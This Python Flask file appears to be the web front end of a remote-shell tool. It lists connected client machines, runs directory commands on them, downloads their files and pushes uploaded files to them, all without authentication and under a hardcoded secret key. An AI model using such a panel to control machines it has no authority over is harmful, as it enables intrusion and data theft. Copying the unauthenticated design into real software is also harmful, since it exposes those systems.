import io
from threading import Thread

from flask import Flask, session, render_template, redirect, url_for, request, send_file

import models
from Server import server

app = Flask(__name__)
app.secret_key = "secret"


@app.route('/')
def default():
    return redirect(url_for("clients"))


@app.route("/clients")
def clients():
    return render_template("clients.html", cls=server.clients)


@app.route("/shell/<shell_id>", methods=["POST", "GET"])
def shell(shell_id):
    shell_id = int(shell_id)
    client = server.clients[shell_id]
    if request.method == "GET":
        return render_template("shell.html", client=client)
    else:
        user_in = request.form["cmd"]
        if user_in == "":
            return render_template("shell.html", client=client)
        cmd = user_in.split(" ")[0]
        if cmd == "clear":
            client.output = []
        elif cmd == "download":
            result = server.handle_command(user_in, client)
            if not type(result) == str:
                file_name = result[0]
                file = result[1]
                return send_file(file,
                                 as_attachment=True,
                                 download_name=file_name)
            else:
                client.append_output(out=result, cmd=user_in)
        elif cmd == "help":
            output = """
            pwd - View current directory
            cd [destination] - Move to different directory (e.g. cd ..)
            ls [args] - List content of directory (-a to include hidden files)
            clear - Clear the console
            download [file] - Download file from client (e.g. download test.txt | /home/test.txt)
            send [file] - Send file from uploaded files to client (e.g. send test.txt) 
            """
            client.append_output(out=output, cmd=cmd)

        else:
            output = server.handle_command(user_in, client)
            client.append_output(out=output, cmd=user_in)
        return render_template("shell.html", client=client)


@app.route("/shell/<shell_id>/upload_file", methods=["POST"])
def upload_file(shell_id):
    shell_id = int(shell_id)
    client = server.clients[shell_id]
    if request.files:
        if "file" in request.files:
            file = request.files["file"]
            in_mem_file = io.BytesIO()
            file.save(in_mem_file)
            print(in_mem_file.getbuffer().nbytes)
            mem_file = models.MemFile(file.filename, in_mem_file)
            client.add_file(mem_file)
    return redirect(url_for("shell", shell_id=shell_id))


if __name__ == '__main__':
    thread = Thread(target=server.listen_for_clients)
    thread.start()
    app.run(host="0.0.0.0")
